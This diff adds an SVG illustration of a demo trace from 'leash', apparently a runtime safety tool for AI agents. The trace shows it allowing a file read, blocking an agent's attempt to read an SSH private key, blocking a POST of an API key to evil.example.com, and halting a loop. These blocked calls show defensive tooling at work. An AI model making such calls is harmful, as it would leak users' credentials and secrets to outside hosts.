@@ -1,0 +1,53 @@
+<svg width="900" height="500" viewBox="0 0 900 500" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="leash view — execution trace timeline">
+  <defs>
+    <style>
+      text { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 14px; }
+      .b { font-weight: 700; }
+      .white { fill: #e5e7eb; }
+      .dim { fill: #94a3b8; }
+      .gray { fill: #6b7280; }
+      .green { fill: #34d399; }
+      .red { fill: #f87171; }
+      .magenta { fill: #c084fc; }
+      .cyan { fill: #22d3ee; }
+    </style>
+  </defs>
+
+  <rect x="0" y="0" width="900" height="500" rx="12" fill="#0b1020"/>
+  <rect x="0" y="0" width="900" height="36" rx="12" fill="#161d33"/>
+  <rect x="0" y="24" width="900" height="12" fill="#161d33"/>
+  <circle cx="22" cy="18" r="6" fill="#ff5f57"/>
+  <circle cx="42" cy="18" r="6" fill="#febc2e"/>
+  <circle cx="62" cy="18" r="6" fill="#28c840"/>
+  <text x="450" y="23" text-anchor="middle" class="dim">leash — runtime safety layer for AI agents</text>
+
+  <g transform="translate(26 64)">
+    <text x="0" y="0"><tspan class="cyan b">$</tspan><tspan class="white"> leash view examples/runaway.jsonl</tspan></text>
+
+    <text x="0" y="34" class="white b">leash trace · run_mr0yz01f</text>
+    <text x="0" y="54" class="dim">policy: demo-strict · 3 rules · default=deny · limits: calls≤50, repeat≤3</text>
+
+    <!-- #01 allowed -->
+    <text x="0" y="90"><tspan class="dim">#01</tspan><tspan class="dim">  +5ms  </tspan><tspan class="green">✔</tspan><tspan class="white b"> fs.read</tspan><tspan class="dim"> (path="src/index.ts")</tspan></text>
+    <text x="56" y="108" class="gray">→ // contents of src/index.ts  export const x = 1;</text>
+
+    <!-- #02 denied (secret) -->
+    <text x="0" y="138"><tspan class="dim">#02</tspan><tspan class="dim">  +7ms  </tspan><tspan class="red">⛔</tspan><tspan class="white b"> fs.read</tspan><tspan class="dim"> (path="/home/user/.ssh/id_rsa")</tspan></text>
+    <text x="56" y="156" class="red">blocked by policy: secret files are off-limits</text>
+
+    <!-- #03 denied (network + redaction) -->
+    <text x="0" y="186"><tspan class="dim">#03</tspan><tspan class="dim">  +7ms  </tspan><tspan class="red">⛔</tspan><tspan class="white b"> http.post</tspan><tspan class="dim"> (url="https://evil.example.com", apiKey=</tspan><tspan class="magenta">"[redacted]"</tspan><tspan class="dim">)</tspan></text>
+    <text x="56" y="204" class="red">blocked by policy: no network egress</text>
+
+    <!-- #06 halted (loop) -->
+    <text x="0" y="234"><tspan class="dim">#06</tspan><tspan class="dim">  +8ms  </tspan><tspan class="magenta">🛑</tspan><tspan class="white b"> fs.read</tspan><tspan class="dim"> (path="src/index.ts")</tspan></text>
+    <text x="56" y="252" class="magenta">loop detected: identical call repeated 4× (cap 3) — halting runaway agent</text>
+
+    <text x="0" y="290" class="white b">summary</text>
+    <text x="0" y="310"><tspan class="green">3 allowed</tspan><tspan class="dim"> · </tspan><tspan class="red">2 denied</tspan><tspan class="dim"> · </tspan><tspan class="cyan">0 rejected</tspan><tspan class="dim"> · </tspan><tspan class="magenta">1 limited</tspan><tspan class="dim"> · </tspan><tspan class="gray">0 errored</tspan></text>
+    <text x="0" y="330" class="dim">3 calls · 0 tokens · 8ms wall</text>
+
+    <rect x="-6" y="352" width="640" height="30" rx="6" fill="#2a1620"/>
+    <text x="6" y="372" class="red b">🛑 HALTED — runaway agent loop stopped, forensic trace preserved</text>
+  </g>
+</svg>
